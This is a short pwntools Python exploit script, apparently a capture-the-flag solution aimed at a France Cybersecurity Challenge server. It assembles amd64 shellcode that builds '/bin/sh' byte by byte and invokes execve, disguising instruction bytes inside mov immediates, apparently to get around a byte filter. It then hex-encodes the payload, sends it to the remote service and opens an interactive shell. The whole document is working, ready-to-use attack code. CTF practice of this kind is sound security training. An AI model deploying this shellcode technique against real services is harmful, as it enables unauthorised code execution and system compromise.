from pwn import *
import binascii

context.update(arch="amd64", os="linux")

shellc = asm('''
  mov bl,0x68
  shl rbx,8
  mov cx,0x48b9

  mov bl,0x73
  shl rbx,8
  mov cx,0x48b9

  mov bl,0x2f
  shl rbx,8
  mov cx,0x48b9

  mov bl,0x6e
  shl rbx,8
  mov cx,0x48b9

  mov bl,0x69
  shl rbx,8
  mov cx,0x48b9

  mov bl,0x62
  shl rbx,8
  mov cx,0x48b9

  mov bl,0x2f
  nop
  nop
  nop
  nop
  mov cx,0x48b9

  push rax
  push rbx
  push rsp
  pop rdi
  mov al,59
  mov cx,0x48b9

  mov rcx,0x5053545fb03b66b9
  mov rcx,0xb32f9090909066b9
  mov rcx,0xb36248c1e30866b9
  mov rcx,0xb36948c1e30866b9
  mov rcx,0xb36e48c1e30866b9
  mov rcx,0xb32f48c1e30866b9
  mov rcx,0xb37348c1e30866b9
  mov rcx,0xb36848c1e30866b9
''')

print('shellcode length: '+str(len(shellc)))
print(hexdump(shellc))

p = remote('challenges.france-cybersecurity-challenge.fr', '2054')
# send the shellcode encoded to hexadecimal
p.sendlineafter('):\n', binascii.hexlify(shellc)  )

p.interactive()
